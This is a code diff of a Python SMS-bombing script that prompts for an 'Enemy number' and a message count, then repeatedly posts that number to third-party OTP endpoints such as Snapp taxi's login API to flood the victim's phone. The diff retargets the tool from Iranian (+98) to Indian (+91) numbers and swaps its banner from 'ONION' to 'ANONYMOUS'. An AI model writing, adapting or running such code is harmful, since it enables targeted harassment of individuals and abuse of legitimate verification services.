@@ -12,15 +12,16 @@ from os import system , name
 def logo() :
  print(color.RED+"""
 \n
- ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
-▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
-▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
-▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
-░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░
-░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
-  ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
-░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░ 
-    ░ ░           ░  ░      ░ ░           ░ </OƝioN
+ ▒█████   ███▄    █  ▒█████   ███▄    █  ▒█████   ███▄    █  ▒██▒  ██▒ ▒█████   ███▄    █ 
+▒██▒  ██▒ ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▒  ██▒▒██▒  ██▒ ██ ▀█   █ 
+▒██░  ██▒▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒██░  ██▒▒██░  ██▒▓██  ▀█ ██▒
+▒██   ██░▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒██   ██░▒██   ██░▓██▒  ▐▌██▒
+░ ████▓▒░▒██░   ▓██░░ ████▓▒░▒██░   ▓██░░ ████▓▒░▒██░   ▓██░░ ████▓▒░░ ████▓▒░▒██░   ▓██░
+░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
+  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░
+░ ░ ░ ▒     ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ 
+    ░ ░           ░     ░ ░           ░     ░ ░           ░     ░ ░           ░ 
+                         </ANONYMOUS
 """+color.GREEN)
 
 
@@ -75,7 +76,7 @@ def start():
     # input data
     logo()
     print("\n\n")
-    phone_number = str(input("[ ] Enemy number:\n>>+98 "))
+    phone_number = str(input("[ ] Enemy number:\n>>+91 "))
     sms_number = int(input("[ ] Number of sms:\n>>"))
     #sleep_number = int(input("[ ] Number of sms sent per second:\n>>"))
 
@@ -84,7 +85,7 @@ def start():
         if sended.count(1) >= sms_number:
             clear()
             log(looping_count, sms_number, phone_number)
-            print("\n[ ] Done, I sent more than {} sms to +98 {}\n".format(sms_number, phone_number ))
+            print("\n[ ] Done, I sent more than {} sms to +91 {}\n".format(sms_number, phone_number ))
             break
         
         else:
@@ -136,7 +137,7 @@ def start():
 # 001 snap
 def snap(phone_number):
     try:
-        phone_number = "+98" + phone_number
+        phone_number = "+91" + phone_number
         data = {"cellphone":phone_number}
         url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
         p = post(url, json=data, timeout=2)
